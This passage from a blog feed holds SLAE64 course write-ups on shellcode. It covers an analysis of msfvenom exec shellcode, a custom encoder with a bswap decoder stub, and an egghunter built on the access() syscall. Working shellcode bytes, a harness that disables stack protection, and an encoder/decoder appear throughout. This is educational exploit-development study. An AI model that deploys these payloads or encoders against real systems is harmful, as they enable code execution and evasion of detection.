&quot;\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00&quot;
&quot;\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f&quot;
&quot;\x05&quot;;

int main()
{

  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then compile it as follows:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;

&lt;p&gt;I started the debugger &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb ./testshellcode&lt;/code&gt; and looked at the state of all the important registers just before taking the syscall - rax, rdi, rsi and rdx. From that we can construct that the syscall to be executed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;is execve as &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; is 0x3b (59 in decimal)&lt;/li&gt;
  &lt;li&gt;the program which will be executed is &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as we can find it from register &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; points to an array at 0x7fffffffdc28 with 3 array elements [“/bin/sh”, “-c”, “whoami”] as array elements are layed out into memory from lower addresses to higher addresses&lt;/li&gt;
  &lt;li&gt;we pass no environment variables to the syscall.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the final syscall, which this shellcode will execute is in following format:&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;whoami&quot;, 0])&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.1/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 1/3 shellcode analysed in this article is the linux/x64/exec payload.</summary></entry><entry><title type="html">Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE4/" rel="alternate" type="text/html" title="Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE4</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE4/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 4/7 assignment is to create a custom encoding scheme like shown in the course’s Insertion encoder chapter. The encoding scheme should be used on the execve-stack shellcode implemented during the course and then executed.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;encoding-scheme&quot;&gt;Encoding scheme&lt;/h3&gt;

&lt;p&gt;I decided to implement an encoding scheme where I would divide the shellcode into 4 byte chunks and reverse the byte order in all of the chunks. For that to work, I also needed to check that the number of total bytes would be divisible by 4. For this I made the check in the python program code below &lt;code class=&quot;highlighter-rouge&quot;&gt;if (length%4 != 0)&lt;/code&gt;. If it turned out that the number of bytes of the shellcode I am using was not divisible by 4 I padded the shellcode with &lt;code class=&quot;highlighter-rouge&quot;&gt;\x90&lt;/code&gt;-s as also seen on the picture below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/encoding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the final encoder.py looks as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#execve stack shellcode from SLAE64 course
import binascii

j = 3
i = 0

shellcode = &quot;\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05&quot;
shellarray = bytearray(shellcode)
length = len(shellarray)
encoded = []

encoded_shellcode = shellcode.encode('hex')
input = &quot;Input: &quot;+ r&quot;\x&quot; + r&quot;\x&quot;.join(encoded_shellcode[n:n+2] for n in range(0, len(encoded_shellcode),2))
print input

#print &quot;Old length: %s&quot; % length

if (length%4 != 0):
	adding = 4 -(length%4)
	for i in range (adding):
		shellarray.append(0x90)

#print &quot;New length with \\x90-s appended: %s&quot; % len(shellarray)

#changing positions
while(j &amp;lt;= len(shellarray)):
	for i in range(4):
		encoded.append(shellarray[j-i])
	j = j + 4

output = binascii.hexlify(bytearray(encoded))
result = &quot;Output (\\xXX format):&quot; + r&quot;\x&quot; + r&quot;\x&quot;.join(output[n : n+2] for n in range(0, len(output), 2))
print result
result2 = &quot;Output (0xXX format): &quot; + r&quot;0x&quot; + r&quot;,0x&quot;.join(output[n : n+2] for n in range(0, len(output), 2))
print result2



# Input: \x48\x31\xc0\x50 \x48\xbb\x2f\x62 \x69\x6e\x2f\x73 \x68\x53\x48\x89 \xe7\x50\x48\x89 \xe2\x57\x48\x89 \xe6\x48\x83\xc0 \x3b\x0f\x05
# Output \x50\xc0\x31\x48 \x62\x2f\xbb\x48 \x73\x2f\x6e\x69 \x89\x48\x53\x68 \x89\x48\x50\xe7 \x89\x48\x57\xe2 \xc0\x83\x48\xe6 \x90\x05\x0f\x3b

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python ./encoder.py
Input: \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
Output (\xXX format):\x50\xc0\x31\x48\x62\x2f\xbb\x48\x2f\x2f\x6e\x69\x48\x53\x68\x73\x48\x50\xe7\x89\x48\x57\xe2\x89\x83\x48\xe6
\x89\x05\x0f\x3b\xc0
Output (0xXX format): 0x50,0xc0,0x31,0x48,0x62,0x2f,0xbb,0x48,0x2f,0x2f,0x6e,0x69,0x48,0x53,0x68,0x73,0x48,0x50,0xe7,0x89,0x48,0x57,
0xe2,0x89,0x83,0x48,0xe6,0x89,0x05,0x0f,0x3b,0xc0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;go-simple-or-go-home---htonl&quot;&gt;Go simple or go home - htonl()&lt;/h3&gt;

&lt;p&gt;In order for this encoder scheme to be useful for us, we should also implement the decoder stub for that particular encoding. Funnily enough I thought implementing the decoder for that would be super difficult and I would need to keep note of where I am currently in the decoded hex string, where are all the &lt;code class=&quot;highlighter-rouge&quot;&gt;4th*X&lt;/code&gt; bytes and when does the hex string end, but that turned out to be wrong assumption. One evening I was thinking of my egghunter solution where I used an &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; syscall for something that it was not really intended for. That funnily brought me to &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; function in C which I have previously used to convert something to network byte order. BECAUSE … it also operates on data in 4 byte chunks and reverses the byte order. How convenient! So I made a quick example with &lt;code class=&quot;highlighter-rouge&quot;&gt;htonl()&lt;/code&gt; to see what instructions it is made up of in assembly and it turned out I only needed 1 instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;bswap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;htonl.c example&lt;/b&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//$ gcc htonl.c -o htonl
//$ gdb ./htonl

#include &amp;lt;arpa/inet.h&amp;gt;
int main() {
  int server_fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in server;
  server.sin_family = AF_INET;
  server.sin_port = htonl(80808080);
  server.sin_addr.s_addr = htonl(INADDR_ANY);
  // ...
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/htonl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;decoder&quot;&gt;Decoder&lt;/h3&gt;

&lt;p&gt;That single instruction - &lt;code class=&quot;highlighter-rouge&quot;&gt;bswap&lt;/code&gt; - turned out to be the key to an easy solve for this decoder routine. The rest of the program is built using the JCP (Jmp-CALL-Pop) technique to get the address of encoded_shellcode to RBX via &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rbx&lt;/code&gt;. In order to save the decoded shellcode somewhere on the stack in &lt;code class=&quot;highlighter-rouge&quot;&gt;allocate_space&lt;/code&gt; I am allocating the length of shellcode worth of space and saving the beginning address of decoded shellcode to R10 for later use. In &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp&lt;/code&gt; section I am performing the check to see if I have reached to the end of the shellcode yet.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;decode&lt;/code&gt; section is undeniably the most important part here. This is where I use RBX to get the address of 1st byte in a 4-byte chunk and then iterating RCX to move from one 4-byte chunk to the next while using bswap to reverse the byte order back to its original order.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text

_start:

	jmp find_address

decoder:
	pop rbx                   ;get the address of the encoded_shellcode
	xor rdi, rdi
	xor rcx, RCX              ;counter

allocate_space:
	sub rsp, 0x20             ;allocate space depending on the length of your shellcode
	mov r10, rsp
	jmp decode

cmp:
	inc rcx
	cmp rcx, 0x20             ;32 - length of the shellcode
	jge decoded_shell

decode:
	mov edi, dword [rbx+rcx]
	bswap edi                 ;reverse the order of 4 bytes
	mov dword [rsp], edi
	add rcx, 4
	add rsp, 4

	loop cmp

find_address:
	call decoder

	encoded_shellcode:	db	0x50,0xc0,0x31,0x48,0x62,0x2f,0xbb,0x48,0x2f,0x2f,0x6e,0x69,0x48,
    0x53,0x68,0x73,0x48,0x50,0xe7,0x89,0x48,0x57,0xe2,0x89,0x83,0x48,0xe6,0x89,0x05,0x0f,0x3b,0xc0


decoded_shell:
	mov rsp, r10        ;get back to the top of the decoded shell on stack
	push r10        ;put the address where decoded shell resides to the top of the stack so we can ret to it
	ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;assemble-link-and-go&quot;&gt;Assemble, link and go&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -felf64 decoder.nasm -o decoder.o
$ ld decoder.o -o decoder
$ ./decoder

$whoami
silvia
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;Encoder.py&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Decoder.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 4/7 assignment is to create a custom encoding scheme like shown in the course’s Insertion encoder chapter. The encoding scheme should be used on the execve-stack shellcode implemented during the course and then executed.</summary></entry><entry><title type="html">Egghunter (64-bit Linux) using access() syscall</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" rel="alternate" type="text/html" title="Egghunter (64-bit Linux) using access() syscall" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE3</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE3/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 3/7 assignment is to study about egg hunters and to create a working demo. So in this article I will give an overview of virtual address space, virtual addresses and how to utilize that knowledge on creating an egghunter. So let’s hunt some eggs.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h2 id=&quot;what-is-an-egghunter&quot;&gt;What is an egghunter&lt;/h2&gt;

&lt;p&gt;When you think of the word “egghunter”, it shouldn’t be too hard to guess that we are going to be dealing with some type of a search or hunt for something valuable. In this case the value lies in the egg which is a unique token that helps us on the right track of executiong our shellcode. Essentially egghunter is a piece of code which searches through the VAS (&lt;em&gt;Virtual Address Space&lt;/em&gt;) looking for a token which we have specified. In order to accomplish this task, we have to have an understanding on what VAS is.&lt;/p&gt;

&lt;h2 id=&quot;virtual-address-space&quot;&gt;Virtual Address Space&lt;/h2&gt;

&lt;p&gt;64-bit architecture presents us with a &lt;code class=&quot;MathJax_Preview&quot;&gt;2^{64}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;2^{64}&lt;/script&gt; = 256TB virtual address space which is divided into user space and kernel space address ranges as shown on the image below. These are the same addresses you see when you are debugging your application in GDB and should not be confused with physical addresses.&lt;/p&gt;

&lt;h3 id=&quot;user-and-kernel-space&quot;&gt;User and kernel space&lt;/h3&gt;

&lt;p&gt;If you would examine the addresses for user and kernel space, it is also pretty clear about the number of actually addressable bits which is &lt;code class=&quot;MathJax_Preview&quot;&gt;2^{48}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;2^{48}&lt;/script&gt; for user and kernel space combined. At the moment this is found feasible as current CPUs only use the lowr of 48 bits and more is not needed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/vas.png&quot; style=&quot;width:50%&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;canonical-addresses&quot;&gt;Canonical addresses&lt;/h3&gt;

&lt;p&gt;Another thing you can notice is that canonical addresses for user and kernel space follow a certain structure. If you dig into &lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-manual-325462.pdf&quot;&gt;Intel 64 and IA-32 architectures manual&lt;/a&gt; they give a pretty direct definition for it, which is: “In 64-bit mode, an address is considered to be in canonical form if address bits 63 through to the most-significant implemented bit by the microarchitecture are set to either all ones or all zeros.” The most significant bit here being the 48th bit means in case we are dealing with an address belonging to the user space, bits 48-64 are set to 0 and address belonging to kernel space those bits (48-64) are set to 1.&lt;/p&gt;

&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/range.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
Canonical addresses - user and kernel space. 1 hex digit presents a 4 digit binary number example: 0x8 = 1000.&lt;/p&gt;

&lt;h3 id=&quot;memory-regions-of-a-mapped-process&quot;&gt;Memory regions of a mapped process&lt;/h3&gt;

&lt;p&gt;Virtual address space is a range of virtual memory addresses that the OS has made available for every process individually.&lt;/p&gt;

&lt;p&gt;It also helps to examine and understand how an executed program is mapped into memory regions and what are their access permissions. For that we can use a command &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /proc/&amp;lt;pid&amp;gt;/maps&lt;/code&gt;. Based on the example below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;we can see that program itself is mapped within 3 pages (1 = 4KB which we can verify with the following command &lt;code class=&quot;highlighter-rouge&quot;&gt;getconf PAGE_SIZE&lt;/code&gt; - 4096 which is 0x1000)&lt;/li&gt;
  &lt;li&gt;we can also see that each of the mapped memory regions is grouped by their access permissions RWX (read/write/execute)
    &lt;ul&gt;
      &lt;li&gt;00400000-00401000 r-xp region is where our executable code lies within&lt;/li&gt;
      &lt;li&gt;00601000-00602000 rw-p is the data section&lt;/li&gt;
      &lt;li&gt;00600000-00601000 r–p contains data that is only readable, like static data, constants&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;all addresses except for the very last one for vsyscall are user space addresses&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/3996/maps
00400000-00401000 r-xp 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
00600000-00601000 r--p 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
00601000-00602000 rw-p 00001000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
7f385cc75000-7f385ce35000 r-xp 00000000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385ce35000-7f385d035000 ---p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d035000-7f385d039000 r--p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d039000-7f385d03b000 rw-p 001c4000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d03b000-7f385d03f000 rw-p 00000000 00:00 0
7f385d03f000-7f385d065000 r-xp 00000000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d24a000-7f385d24d000 rw-p 00000000 00:00 0
7f385d264000-7f385d265000 r--p 00025000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d265000-7f385d266000 rw-p 00026000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d266000-7f385d267000 rw-p 00000000 00:00 0
7ffd6f5e8000-7ffd6f609000 rw-p 00000000 00:00 0                          [stack]
7ffd6f634000-7ffd6f637000 r--p 00000000 00:00 0                          [vvar]
7ffd6f637000-7ffd6f639000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’d like to stop on the access permissions of the memory regions for one extra moment here and raise a question: how can we apply this knowledge for implementing an egg hunter? Well our goal is to find the egg token from somewhere in memory. We do not know where the token we are looking for might be, so do we have to search through the entire virtual address space? As it is rather large maybe there is a way we could decrement that search time?
We know that contiguous virtual memory is divided into pages and for all regions memory allocated is a multiple of 4KB. Each one of those pages has specific permissions which are applied to all addresses within the range of the page.&lt;/p&gt;

&lt;p&gt;We can assume that our egg would be on an address which is accessible to us therefore we would need to find a way to test for accessible/inaccessible addresses. Syscalls come to the rescue!&lt;/p&gt;

&lt;h3 id=&quot;how-can-we-validate-if-an-address-is-accessible&quot;&gt;How can we validate if an address is accessible?&lt;/h3&gt;

&lt;p&gt;Referring to the &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Skape’s paper&lt;/a&gt; as many have done in egghunter write ups before me, I stumbled upon the &lt;code class=&quot;highlighter-rouge&quot;&gt;access()&lt;/code&gt; syscall which is essentially meant to validate permissions of a file. Access syscall has the following format where 2 arguments need to be specified: &lt;code class=&quot;highlighter-rouge&quot;&gt;int access(const char *pathname, int mode);&lt;/code&gt;. It expects 1st argument to be a memory address and 2nd argument should specify the permission we want to test for: 0 - F_OK (existance), 1 - X_OK (execute), 2 - W_OK (write), 4 - R_OK (read). Not letting the definition limit us, what i learned was that we can submit any address to this syscall to validate if the address is accessible or it will produce an EFAULT (&lt;code class=&quot;highlighter-rouge&quot;&gt;0xf...f2 in RAX after returning from syscall&lt;/code&gt;) in case it is not. I had never seen this syscall that way and I find it extremely awesome!&lt;/p&gt;

&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/access.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
Searching through virtual address space by testing the first address of every page to validate if the addresses within the page are accessible.&lt;/p&gt;

&lt;p&gt;So let’s try to implement our egg hunter based on all the knowledge we have stuffed into our brain now :D&lt;/p&gt;

&lt;h3 id=&quot;egghunter-implementation&quot;&gt;Egghunter implementation&lt;/h3&gt;

&lt;p&gt;In &lt;strong&gt;Step 1&lt;/strong&gt; and &lt;strong&gt;Step 2&lt;/strong&gt; (code example below) I am preparing the arguments for the &lt;code class=&quot;highlighter-rouge&quot;&gt;access()&lt;/code&gt; syscall we want to be using. We want to validate whether the address is accessible (F_OK - 0) so I zero out the RSI register which by convention is the 2nd parameter passed on to the syscall. To initialize the 1st parameter we will use the value at RSI to pop it to RDI as well. Within &lt;code class=&quot;highlighter-rouge&quot;&gt;go_to_next_page:&lt;/code&gt; section I &lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt; the lower 16 bits of RDI (or di, 0xfff) and by incrementing RDI I reach to the beginning of a page at 0x1000.&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;Step 3&lt;/strong&gt; I assign the &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall number 21 in decimal to RAX by convention and make the call. As a result in &lt;strong&gt;Step 4&lt;/strong&gt; I expect to check if an &lt;a href=&quot;http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html&quot;&gt;EFAULT (Bad address)&lt;/a&gt; occured which is the reason for &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp al, 0xf2&lt;/code&gt;. If the first address of the page turns out to be inaccessible I know that the rest of the addresses within that page will be as well as same permissions are applied to the whole page. Therefore we can jump back to &lt;code class=&quot;highlighter-rouge&quot;&gt;go_to_next_page&lt;/code&gt; to get the start address of the next page and try that instead.&lt;/p&gt;

&lt;p&gt;If it occurs in &lt;strong&gt;Step 4&lt;/strong&gt; that the address is accessible to us and we did not receive EFAULT we move a 4 byte value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x9050904f&lt;/code&gt; to EAX and increment the lower byte to get our egg value. You might be asking why do we do it this way. The reason for that is this way we wouldn’t stumble upon our egg value within the egg hunter code as our goal is to find it from the beginning of our shellcode instead. Now that we have the egg value in EAX (don’t forget little-endian here) we will use the &lt;a href=&quot;http://faydoc.tripod.com/cpu/scasd.htm&quot;&gt;scasd&lt;/a&gt; scan a string command to compare the egg value we search for with the value in RAX.&lt;/p&gt;

&lt;p&gt;PS! RAX by convention holds the return value from the syscall. In our case it will be an address in memory which would possibly hold the value of the egg in the beginning of the shellcode.&lt;/p&gt;

&lt;p&gt;If the values being checked for do not match, we can move on to another address within the same page. However if they do, we know that the address for our shellcode is in RDI so we make the jump there instead.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start
section .text
_start:

;STEP1
	;int access(const char *pathname, int mode);
	xor rsi, rsi
	push rsi
	pop rdi

;STEP2
go_to_next_page:
	or di, 0xfff
	inc rdi

;STEP3
forward_4_bytes:
	xor rax, rax
	mov al, 21
	syscall

;STEP4
efault_check:
	cmp al, 0xf2
	jz go_to_next_page
	mov eax, 0x9050904f
	inc al
	scasd
	jnz forward_4_bytes
	jmp rdi

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So let’s dump the egg hunter code with objdump in order to include it to our test C script to validate it’s working:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
&quot;\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the final C program I will be also using the 21-byte shellcode from: &lt;a href=&quot;https://www.exploit-db.com/exploits/41750&quot;&gt;https://www.exploit-db.com/exploits/41750&lt;/a&gt;.&lt;/p&gt;

